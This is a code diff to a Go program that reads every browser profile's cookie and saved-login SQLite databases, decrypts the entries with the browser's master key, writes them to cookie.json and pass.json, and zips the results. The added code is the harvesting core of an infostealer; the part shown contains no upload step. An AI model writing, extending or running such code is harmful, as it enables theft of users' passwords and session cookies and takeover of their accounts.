@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"os"
 	"path/filepath"
 	"strings"
@@ -73,6 +74,8 @@ func MainBL(browser model.BrowserPaths) {
 	if err != nil {
 		fmt.Println("error cant get masterKey")
 	}
+	cookie_ok := make([]*model.Cookie, 0)
+	info_ok := make([]*model.Info, 0)
 	for _, profile := range allProfile.Alls {
 		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
 		// connect sqlite3
@@ -82,10 +85,27 @@ func MainBL(browser model.BrowserPaths) {
 		}
 		fmt.Println(connToken)
 		token, _ := pkg.QueryData(connToken, pkg.CookiesSQL)
-		fmt.Println(token)
-		jsonBytes, err := json.Marshal(token)
-		jsonString := string(jsonBytes)
-		fmt.Println(jsonString)
+		listToken := token
+
+		for _, value := range listToken {
+			tmp := value["is_httponly"]
+			fmt.Println(tmp)
+			tokenRow := &model.Cookie{
+				Domain:         value["host_key"].(string),
+				ExpirationDate: float64(value["expires_utc"].(int64)) / 1000000,
+				HttpOnly:       value["is_httponly"],
+				Name:           value["name"].(string),
+				Path:           value["path"].(string),
+				Secure:         value["is_secure"],
+				Value:          value["encrypted_value"].(string),
+			}
+			result_token := pkg.GetCookie(tokenRow, allProfile.PathSource+browser.Local, masterKey)
+			if result_token != nil {
+				cookie_ok = append(cookie_ok, result_token)
+			}
+			fmt.Println(result_token)
+		}
+		fmt.Println(listToken)
 
 		path = fmt.Sprintf("%v\\Login Data", profile)
 		connInfo, err := pkg.ConnectSQLite(path)
@@ -99,6 +119,7 @@ func MainBL(browser model.BrowserPaths) {
 		//}
 
 		//listInfo := pkg.FilterConditions(info, conditions, "action_url")
+
 		listInfo := info
 		fmt.Println(listInfo)
 		profiletmp := strings.Split(profile, "\\")
@@ -111,7 +132,44 @@ func MainBL(browser model.BrowserPaths) {
 				Profile:  profiletmp[len(profiletmp)-1],
 			}
 			result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
+			if result != nil {
+				info_ok = append(info_ok, result)
+			}
 			fmt.Println(result)
 		}
 	}
+
+	fmt.Println(info_ok)
+	fmt.Println(cookie_ok)
+
+	err = os.Mkdir("storage", 0755)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	file_cookie, err := os.Create("./storage/cookie.json")
+	defer func() {
+		if err := file_cookie.Close(); err != nil {
+			panic(err)
+		}
+	}()
+	file_pass, err := os.Create("./storage/pass.json")
+	defer func() {
+		if err := file_pass.Close(); err != nil {
+			panic(err)
+		}
+	}()
+
+	encoder_cookie := json.NewEncoder(file_cookie)
+	err = encoder_cookie.Encode(cookie_ok)
+
+	encoder_pass := json.NewEncoder(file_pass)
+	err = encoder_pass.Encode(info_ok)
+
+	err = pkg.ZipSource("storage", "storage.zip")
+	if err != nil {
+		log.Fatal(err)
+	}
+
 }
